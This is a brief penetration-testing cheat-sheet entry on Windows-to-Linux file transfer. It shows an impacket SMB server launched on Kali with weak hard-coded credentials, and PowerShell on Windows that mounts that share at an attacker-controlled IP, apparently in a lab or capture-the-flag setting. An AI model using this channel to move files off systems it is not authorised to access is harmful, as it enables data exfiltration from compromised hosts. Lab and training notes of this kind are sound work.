# ðŸ“¤ File Transfer

## Windows->Linux Methods

### SMB Server

On Kali:

```
impacket-smbserver smbserver $(pwd) -smb2support -user hacker -password password
```

On Windows:

```
$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('hacker',$pass)

New-PSDrive -Name hacker -PSProvider FileSystem -Credential $cred -Root \\10.10.16.12\smbserver

cd hacker:
```

* Be sure to open up the file through the file manager on Linux (GUI)
* This makes things easier
